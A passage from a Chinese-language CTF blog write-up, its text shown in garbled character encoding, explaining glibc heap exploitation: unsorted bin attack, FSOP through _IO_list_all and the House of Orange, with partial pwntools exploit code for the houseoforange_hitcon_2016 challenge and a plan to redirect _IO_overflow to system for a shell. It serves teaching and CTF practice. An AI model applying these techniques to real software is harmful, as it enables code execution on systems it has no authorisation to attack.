class="line">è¿™ä¸ªå°±æ˜¯æŠŠç°åœ¨çš„chunk2åœ°å€ç»™main_arenaçš„bkæŒ‡é’ˆ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av)</span><br><span class="line">è¿™ä¸ªå°±æ˜¯æŠŠmain_arenaçš„åœ°å€ç»™bckï¼ˆä¹Ÿå°±æ˜¯chunk2)çš„fdæŒ‡é’ˆ</span><br></pre></td></tr></table></figure><p>è€Œè¿™å››æ­¥ä¹‹åï¼Œä¹Ÿå°±å°†chunk3ä»è¿™ä¸ªåŒå‘é“¾è¡¨ä¸­è¸¢äº†å‡ºå»ã€‚</p><p>è¿™å››æ­¥ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä»ç¬¬äºŒæ­¥è¿›è¡Œæ”»å‡»ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æº¢å‡ºæ¥ä¼ªé€ è¿™ä¸ªbck(ä¹Ÿå°±æ˜¯victim-&gt;bkï¼Œ<strong>å¤§ç™½è¯å°±æ˜¯ç”¨æº¢å‡ºunsorted binä¸­çš„å°¾éƒ¨çš„chunkçš„bkæŒ‡é’ˆï¼ˆfdæŒ‡é’ˆæ— æ‰€è°“ï¼‰</strong>ï¼‰ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†unsorted_chunks (av)(è¿™ä¸ªä¹Ÿå°±æ˜¯main_arena+88&#x2F;96çš„åœ°å€)å†™å…¥åˆ°æˆ‘ä»¬ä¼ªé€ çš„bck-&gt;fd(ä¹Ÿå°±æ˜¯bck+0x10)ä¸­ã€‚<strong>å¦‚æœæˆ‘ä»¬å°†ä¼ªé€ çš„åœ°å€å…ˆ-0x10ï¼Œé‚£ä¹ˆæœ€åè¿™ä¸ªä¼ªé€ çš„åœ°å€å°±ä¼šè¢«å†™å…¥main_arena+88æˆ–main_arena+96çš„åœ°å€ã€‚</strong>ä¼ªé€ ä¹‹åï¼Œæˆ‘ä»¬ä»unsorted binä¸­å°†å †å—ç”³è¯·å‡ºæ¥<strong>(å¦‚æœç¯¡æ”¹çš„è¿™ä¸ªä½äºunsorted binä¸­çš„å †å—sizeä¸º0x900ï¼Œé‚£å°±å¿…é¡»è¦ç”³è¯·0x900å †å—ï¼Œä¸èƒ½å°äº(å› ä¸ºè¿™æ ·ä¼šå°†å †å—è¿›è¡Œåˆ‡å‰²)ä¹Ÿä¸èƒ½å¤§äº(å› ä¸ºå¤§äºçš„è¯å°±ä¸ä¼šä»unsorted binä¸­æ‹¿å †å—äº†))ï¼Œå½“æŠŠ0x900çš„å †å—ç”³è¯·å‡ºæ¥æ—¶ï¼Œå°±å®Œæˆäº†åœ°å€å†™å…¥ã€‚</strong></p><p>å¬èµ·æ¥æ„Ÿè§‰æŒºç§€ï¼Œä½†æ˜¯ä»”ç»†ä¸€æƒ³ä¼¼ä¹æ²¡å•¥ç”¨ï¼Œå¥½åƒè¿™åªèƒ½æŠŠä¸€ä¸ªå¾ˆå¤§çš„æ•°å€¼å†™åˆ°æˆ‘ä»¬æŒ‡å®šçš„åœ°ç‚¹ï¼ˆå› æ­¤è¿™ä¸ªæ”»å‡»ä¹Ÿæ˜¯ä¸€ä¸ªè¾…åŠ©çš„æ”»å‡»æ‰‹æ®µï¼Œè¿˜éœ€è¦é…åˆå…¶ä»–æ”»å‡»æ‰èƒ½å‘æŒ¥å‡ºæ¥ç›¸å½“å¤§çš„æ•ˆæœï¼‰ã€‚</p><blockquote><p><strong>æ³¨æ„ï¼šç”±äºæ‰§è¡Œå®Œunsorted bin attack åçš„chunk2å·²ç»å˜æˆäº†ä¸€ä¸ªlibcä¸­çš„åœ°å€ï¼ˆåº”è¯¥æ˜¯main_arena+88çš„åœ°å€ï¼‰ï¼Œæ¥ä¸‹æ¥å†ä»unsorted binä¸­ç”³è¯·å †å—æ—¶ï¼Œæ‰§è¡Œbck-&gt;fdè¿™æ­¥è¯•å›¾å¾€libcè¿™ä¸ªä¸å¯å†™çš„åœ°å€å†™å…¥æ•°æ®ï¼Œè€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚<u>æ‰€ä»¥unosrtedbin attackä¹‹åï¼Œæ— æ³•å†ä»unsorted binä¸­ç”³è¯·å †å—äº†</u></strong></p></blockquote><p>é…åˆåˆšæ‰çš„house of orangeæ”»å‡»åäº§ç”Ÿçš„ä½äºunsorted binä¸­çš„å †å—ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè¦†ç›–è¿™ä¸ªä½äºunsorted binä¸­å †å—çš„bkæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿå¾€ä»»æ„åœ°å€å†™ä¸€ä¸ªmain_arena+88(96)ã€‚è€Œæˆ‘ä»¬è¦å»é€šè¿‡unsorted bin attackå‘_IO_list_allå†™å…¥è¿™ä¸ªåœ°å€main_arena+88,ç„¶åå»æ‰“ä¸€ä¸ªFSOPã€‚</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP:"></a>FSOP:</h2><p>FSOPçš„æ ¸å¿ƒæ˜¯å»ç¯¡æ”¹_IO_list_allå’Œ_chainï¼Œæ¥åŠ«æŒIO_FILEç»“æ„ä½“ã€‚è®©IO_FILEç»“æ„ä½“è½åœ¨æˆ‘ä»¬å¯æ§çš„å†…å­˜ä¸Šã€‚ç„¶ååœ¨FSOPä¸­æˆ‘ä»¬ä½¿ç”¨_IO_flush_all_lockpæ¥åˆ·æ–°_IO_list_allé“¾è¡¨ä¸Šçš„æ‰€æœ‰æ–‡ä»¶æµï¼Œä¹Ÿå°±æ˜¯å¯¹æ¯ä¸ªæµéƒ½æ‰§è¡Œä¸€ä¸‹fflushï¼Œè€Œfflushæœ€ç»ˆè°ƒç”¨äº†vtableä¸­çš„_IO_overflow</p><p>è€Œå‰é¢æåˆ°äº†ï¼Œæˆ‘ä»¬å°†IO_FILEç»“æ„ä½“è½åœ¨æˆ‘ä»¬å¯æ§çš„å†…å­˜ä¸Šï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶vtableçš„ï¼Œ<strong>æˆ‘ä»¬å°†vtableä¸­çš„_IO_overflowå‡½æ•°åœ°å€æ”¹æˆsystemåœ°å€å³å¯</strong>ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯IO_FILEç»“æ„ä½“çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬è®©IO_FILEç»“æ„ä½“ä¸­çš„flagsæˆå‘˜ä¸º&#x2F;bin&#x2F;shå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå½“<strong>æ‰§è¡Œexitå‡½æ•°</strong>æˆ–è€…<strong>libcæ‰§è¡Œabortæµç¨‹æ—¶</strong>æˆ–è€…<strong>ç¨‹åºä»mainå‡½æ•°è¿”å›æ—¶</strong>è§¦å‘äº†_IO_flush_all_lockpå³å¯æ‹¿åˆ°shell</p><p>ä¸‹é¢æ˜¯é“¾è¡¨çš„æ­£å¸¸ç»“æ„</p><p><img src="/../img/2706180-20220920202054550-1462970818.png"></p><p>ä¸‹é¢æ˜¯FSOPçš„å¸ƒå±€ï¼Œé¦–å…ˆç¯¡æ”¹_IO_list_allä¸ºmain_arena+88è¿™ä¸ªåœ°å€(å› ä¸ºè¿™ç‰‡å†…å­˜æ˜¯ä¸å¯æ§çš„)ï¼Œchainå­—æ®µæ˜¯é¦–åœ°å€åŠ ä¸Š0x68åç§»å¾—åˆ°çš„ã€‚å› æ­¤chainå­—æ®µå†³å®šäº†ä¸‹ä¸€ä¸ªIO_FILEç»“æ„ä½“çš„åœ°å€ä¸ºmain_arena+88+0x68ï¼Œè¿™ä¸ªåœ°å€æ°å¥½æ˜¯smallbinä¸­sizeä¸º0x60çš„æ•°ç»„ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å°†ä¸€ä¸ªchunkæ”¾åˆ°è¿™ä¸ªsmall binä¸­sizeä¸º0x60çš„é“¾ä¸Šï¼Œé‚£ä¹ˆç¯¡æ”¹_IO_list_allä¸ºmain_arena+88è¿™ä¸ªåœ°å€åï¼Œsmall binä¸­çš„chunkå°±æ˜¯IO_FILEç»“æ„ä½“äº†ï¼Œå°†å…¶ç”³è¯·å‡ºæ¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™å—å†…å­˜äº†ï¼Œä»è€Œä¼ªé€ vtableå­—æ®µè¿›è¡Œå¸ƒå±€æœ€ç»ˆæ‹¿åˆ°shellã€‚</p><p><img src="/../img/2706180-20220920202121457-1221438245.png"></p><p>ä¸‹é¢è¯´ä¸€ä¸‹å¸ƒå±€æ—¶éœ€è¦ç¯¡æ”¹å“ªäº›å­—æ®µæ¥ç»•è¿‡ifçš„æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿä¸Šé¢çš„ä»£ç å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬è¦æƒ³æ‰§è¡Œ_IO_OVERFLOW (fp, EOF)å°±éœ€è¦è®©æœ€å¤–é¢çš„ifä¸­&amp;&amp;å‰é¢çš„é‚£éƒ¨åˆ†æˆç«‹ï¼Œè€Œè¿™éƒ¨åˆ†ä¸­é—´åˆç”¨äº†ä¸€ä¸ª||æ¥è¿æ¥ä¸¤ä¸ªæ¡ä»¶ï¼Œåˆ†åˆ«æ˜¯<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>å’Œ<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base</code><br>è¿™ä¸¤éƒ¨åˆ†æ¡ä»¶ä»»æ„æ»¡è¶³ä¸€å¤„å³å¯ï¼Œå‰é¢é‚£ä¸ªéƒ¨åˆ†çš„æ¡ä»¶æ»¡è¶³èµ·æ¥å¾ˆçœäº‹ï¼Œæˆ‘ä»¬åªéœ€è¦è®©mode&#x3D;0,_IO_write_ptr&#x3D;1,_IO_write_base&#x3D;0å³å¯(è¿™ä»¨å€¼æ”¹æˆå…¶ä»–çš„ä¹Ÿè¡Œï¼Œåªéœ€è¦æ»¡è¶³æ¡ä»¶å³å¯)ï¼Œè¿™æ ·å°±ä¼šè§¦å‘_IO_OVERFLOWã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><p>ä¸ºä»€ä¹ˆhouse of orangeåæ‰“FSOPæˆåŠŸçš„æ¦‚ç‡æ˜¯1&#x2F;2ï¼Ÿ</p><p>ç”±äºè§¦å‘äº†_IO_flush_all_lockpå‡½æ•°ï¼Œä¼šæ ¹æ®_IO_list_allå’Œchainå­—æ®µæ¥å»ä¾æ¬¡éå†é“¾è¡¨ä¸Šçš„æ¯ä¸ªç»“æ„ä½“ï¼Œåœ¨æˆ‘ä»¬æ•´ä½“å¸ƒå±€å®Œæˆåï¼Œç¬¬ä¸€ä¸ªç»“æ„ä½“å°±æ˜¯ä»main_arena+88å¼€å§‹ã€‚è€Œç¬¬ä¸€ä¸ªç»“æ„ä½“çš„modeå­—æ®µæ˜¯main_arena+88+0xc0å¤„çš„æ•°æ®å†³å®šçš„(å¦‚ä¸‹å›¾)ã€‚<strong>modeå­—æ®µæ˜¯å››å­—èŠ‚</strong></p><p><img src="/../img/2706180-20220920202140803-372395368.png"></p><p>è€Œä¸Šé¢è¿™ä¸ªåœ°å€ç”±äºlibcåœ°å€éšæœºåŒ– å¯¼è‡´è¿™ä¸ªå€¼çš„è¡¥ç å¯èƒ½æ˜¯æ­£ä¹Ÿå¯èƒ½æ˜¯è´Ÿï¼Œä¹Ÿå°±æ˜¯è¯´è¿™å››ä¸ªå­—èŠ‚å¯èƒ½æ˜¯0åˆ°0xffffffffä¹‹é—´çš„ä»»æ„å€¼ï¼Œä½†æ˜¯å¦‚æœå¤§äº0x7fffffffçš„è¯è¯¥å€¼å°±ä¸ºè´Ÿï¼Œå°äºåˆ™ä¸ºæ­£ã€‚è¿™ä¸ª0xffffffff&#x2F;2çš„å€¼ æ­£å¥½å°±æ˜¯æœ€å¤§çš„æ­£å€¼ä¸º0x7fffffff æ‰€ä»¥åˆšå¥½_modeå­—æ®µä¸ºè´Ÿçš„æ¦‚ç‡æ˜¯1&#x2F;2</p><p><strong>é‚£ä¸ºå•¥éè¦è¿™ä¸ªmodeå­—æ®µä¸ºè´Ÿæ‰è¡Œå‘¢ï¼Ÿ</strong></p><p>å› ä¸ºå€˜è‹¥modeä¸ºæ­£ï¼Œåˆ™ä¸Šé¢ifæ£€æŸ¥çš„è¿™éƒ¨åˆ†<code>fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> å°±ä¼šæˆç«‹ã€‚è¿™æ ·å°±ä¼šè§¦å‘_IO_OVERFLOWå‡½æ•°(å¯æ­¤æ—¶åœ¨éå†ç¬¬ä¸€ä¸ªIO_FILEç»“æ„ä½“)ï¼Œä½†æ˜¯æˆ‘ä»¬çš„å¸ƒå±€æ˜¯åœ¨ç¬¬äºŒä¸ªIO_FILEç»“æ„ä½“ä¸Šï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯éå†åˆ°ç¬¬äºŒä¸ªIO_FILEç»“æ„ä½“çš„æ—¶å€™è§¦å‘ IO_OVERFLOWå‡½æ•°ã€‚å¦‚æœéå†ç¬¬ä¸€ä¸ªç»“æ„ä½“æ—¶è§¦å‘äº†_IO_OVERFLOWå‡½æ•°,ç¨‹åºåˆ™ä¼šå´©æºƒï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•æ§åˆ¶vtableè¡¨é¡¹ã€‚</p><blockquote><p>house of orangeä¸­çš„å‡½æ•°è°ƒç”¨æµç¨‹ä¸ºï¼š</p><p>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</p></blockquote><p>IO_FILEç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vtableä¸­çš„å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><h4 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h4><p><img src="/../img/2706180-20220920202755893-646421990.png"></p><h4 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h4><p><img src="/../img/2706180-20220920202813042-943539521.png"></p><p>åœ¨editå‡½æ•°ä¸­ï¼Œå¾€å †å—é‡Œå†™å…¥æ•°æ®æ—¶ï¼Œåˆè¯¢é—®äº†ä¸€æ¬¡sizeï¼Œå› æ­¤editå‡½æ•°ä¸­å­˜åœ¨å †æº¢å‡ºã€‚</p><p>ä¸è¿‡è¿™é“é¢˜çš„éš¾ç‚¹åœ¨äºé¢˜ç›®ä¸­æ²¡æœ‰freeå‡½æ•°ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬ä»¥å‰çš„æ‰‹æ³•å‡ ä¹æ— æ³•åˆ©ç”¨ã€‚è€Œhouse of orangeå¯ä»¥å»äº§ç”Ÿä¸€ä¸ªä½äºunsorted binä¸­çš„å †å—ã€‚</p><h4 id="åˆ©ç”¨è¿‡ç¨‹ï¼š"><a href="#åˆ©ç”¨è¿‡ç¨‹ï¼š" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹ï¼š"></a>åˆ©ç”¨è¿‡ç¨‹ï¼š</h4><h5 id="house-of-orange-1"><a href="#house-of-orange-1" class="headerlink" title="house of orange:"></a>house of orange:</h5><p>å› æ­¤æˆ‘ä»¬è¿™é“é¢˜å…ˆæ‰“ä¸€ä¸ªhouse of orangeï¼Œåšå‡ºæ¥ä¸€ä¸ªè¢«é‡Šæ”¾æ‰çš„å †å—å†è¯´ã€‚</p><p>è¿™éƒ¨åˆ†çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_e,d_a,d_s)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/../img/2706180-20220920202831416-954761380.png"></p><p>ç„¶åæˆ‘ä»¬ç”³è¯·ä¸€ä¸ª0x1000çš„å †å—ï¼Œå‘ç°top chunkä¸å¤Ÿç”¨äº†ï¼Œå°±ä¼šå°†æ—§çš„top chunkç»™é‡Šæ”¾æ‰(å¦‚ä¸‹)</p><p><img src="/../img/image-20221007234332601.png"></p><h5 id="æ³„éœ²åœ°å€ï¼š"><a href="#æ³„éœ²åœ°å€ï¼š" class="headerlink" title="æ³„éœ²åœ°å€ï¼š"></a>æ³„éœ²åœ°å€ï¼š</h5><p>æ­¤æ—¶æˆ‘ä»¬é€šè¿‡æ‰“house of orangeå¾—åˆ°äº†ä¸€ä¸ªunsorted binä¸­çš„å †å—ï¼Œä½†æ˜¯ä¸ºäº†ä¹‹åçš„æ‰‹æ³•é¡ºåˆ©è¿›è¡Œï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‹¿åˆ°ä¸€ä¸ªå †åœ°å€å’Œlibcåœ°å€ã€‚è€Œè¿™é“é¢˜å…¶å®è¿˜å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œå°±æ˜¯å¿˜è®°åœ¨è¾“å…¥å‡½æ•°ä¸­è¾“å…¥æ•°æ®åï¼Œç»™å­—ç¬¦ä¸²æœ«å°¾åŠ ä¸Š\x00äº†ï¼Œè¿™å°±å¯¼è‡´äº†åªè¦è®©å †å—è¿›å…¥unsorted binä¸­ï¼Œå°±ä¼šæ®‹ç•™fdå’ŒbkæŒ‡é’ˆï¼Œå†æ¬¡ç”³è¯·çš„æ—¶å€™å³å¯æ³„éœ²libcã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦å †åœ°å€ï¼Œå°±éœ€è¦ç”³è¯·ä¸€ä¸ªlargebin sizeçš„chunkã€‚</p><p>ç”±äºæœ€åˆéå†unsorted binçš„æ—¶å€™ï¼Œä¼šå°†å…¶ä¸­çš„å †å—åˆ†ç±»æ”¾å…¥small binæˆ–è€…large binä¸­ï¼Œè¿™æ ·ç¨‹åºä¸­é‚£ä¸ªå¤§å †å—å°±ä¼šè¢«åˆ†åˆ°large binä¸­ï¼Œç„¶åå¯ç”¨fd_nextsizeå’Œbk_nextsizeæŒ‡é’ˆ(å †åœ°å€å°±ä¼šæ®‹ç•™åˆ°è¿™ä¸Šé¢)</p><p>ä»large binç”³è¯·å‡ºæ¥çš„chunkä¸Šé¢æ®‹ç•™äº†libcå’Œå †åœ°å€ï¼Œæˆ‘ä»¬æ‰§è¡Œshowå‡½æ•°å³å¯è¿›è¡Œæ³„éœ²</p><p><img src="/../img/2706180-20220920202918866-471108266.png"></p><p>è¿™éƒ¨åˆ†expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="unsorted-bin-attackï¼š"><a href="#unsorted-bin-attackï¼š" class="headerlink" title="unsorted bin attackï¼š"></a>unsorted bin attackï¼š</h5><p>æ­£å¦‚ä¸Šæ–‡æåˆ°çš„ï¼Œåœ¨house of orangeä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ‰“unsorted bin attackå°†main_arena+88&#x2F;96çš„åœ°å€å†™å…¥_IO_list_allã€‚ è¿™é‡Œåˆ©ç”¨æº¢å‡ºï¼Œç›´æ¥å»ä¿®æ”¹chunkçš„bkæŒ‡é’ˆä¸º_IO_list_all-0x10å³å¯(å¦‚ä¸‹å›¾)</p><p><img src="/../img/2706180-20220920203032658-408826904.png"></p><p>è¿™æ ·ç­‰åˆ°ä¸‹ä¸€æ¬¡mallocç”³è¯·å †å—çš„æ—¶å€™ï¼Œå°±ä¼šå°†main_arena+88çš„åœ°å€å†™å…¥_IO_list_allï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="/../img/image-20221007234402464.png" alt="image-20221007234402464"></p><p>ç”±äºé“¾è¡¨å¤´_IO_list_allå·²ç»è¢«ç¯¡æ”¹ï¼Œå°±å¯¼è‡´äº†ä¹‹åçš„IO_FILEç»“æ„ä½“ä¹Ÿéƒ½è¢«ç ´åäº†ï¼Œæˆ‘ä»¬çœ‹ä¸‹ç°åœ¨é“¾è¡¨ä¸Šç¬¬ä¸€ä¸ªçš„ç»“æ„ä½“(å¦‚ä¸‹)</p><p><img src="/../img/2706180-20220920203059472-1818877916.png"></p><p>ç°åœ¨çš„chainå­—æ®µçš„åœ°å€å¦‚ä¸‹</p><p><img src="/../img/2706180-20220920222700976-122227575.png"></p><p>è€Œè¿™ä¸ªåœ°å€æ˜¯smallbinä¸­sizeä¸º0x60çš„æ•°ç»„çš„ä½ç½®ï¼Œå‡è®¾æˆ‘ä»¬åœ¨smallbinä¸­ä¸º0x60çš„å¤§å°çš„å †å—ï¼Œé‚£æˆ‘ä»¬å°†å †å—ç”³è¯·å‡ºæ¥ï¼Œå†™å…¥çš„æ•°æ®å°±å¯ä»¥ç›´æ¥æ§åˆ¶ç¬¬äºŒä¸ªIO_FILEç»“æ„ä½“ã€‚è®©smallbinä¸­å‡ºç°ä¸€ä¸ª0x60çš„å †å—çš„æ–¹æ³•æ˜¯æå‰ç”¨editå‡½æ•°æ¥ç¯¡æ”¹ä½äºunsorted binä¸­å †å—çš„sizeï¼Œç„¶åå†æ¬¡è°ƒç”¨mallocå‡½æ•°çš„æ—¶å€™ä¼šå»éå†å„ä¸ªbinsï¼Œéå†unsorted binçš„æ—¶å€™ä¼šå°†è¯¥binsçš„å †å—è¿›è¡Œåˆ†ç±»(æ”¾å…¥small binæˆ–è€…large binä¸­)</p><p>å› ä¸ºç¯¡æ”¹sizeä¸º0x60ï¼Œæ‰€ä»¥è¯¥å †å—ä¾¿ä¼šè¿›å…¥small binä¸­sizeä¸º0x60çš„é“¾è¡¨ä¸­ã€‚å†æ¬¡åˆ†é…å‡ºæ¥æ—¶ï¼Œæˆ‘ä»¬å³å¯æ§åˆ¶ç¬¬äºŒä¸ªIO_FILEç»“æ„ä½“ã€‚(å¦‚ä¸‹å›¾ï¼Œæ­¤æ—¶æ˜¯å †å—è¿›å…¥äº†smallbinä¸­ï¼Œå¯ä»¥å‘ç°æ­¤æ—¶çš„chainå­—æ®µå·²ç»å˜æˆäº†æˆ‘ä»¬å †å—çš„åœ°å€)</p><p><img src="/../img/image-20221007234456349.png" alt="image-20221007234456349"></p><h5 id="FSOPï¼š"><a href="#FSOPï¼š" class="headerlink" title="FSOPï¼š"></a>FSOPï¼š</h5><p>ä¸Šå›¾çš„chainå­—æ®µæˆåŠŸä¸ºå †åœ°å€ï¼Œå°±è¯´æ˜æˆ‘ä»¬å·²ç»å¯ä»¥æ§åˆ¶ä¸‹ä¸€ä¸ªçš„IO_FILEç»“æ„ä½“äº†ï¼Œä¸‹é¢è¯´ä¸€ä¸‹å¦‚ä½•æ„é€ 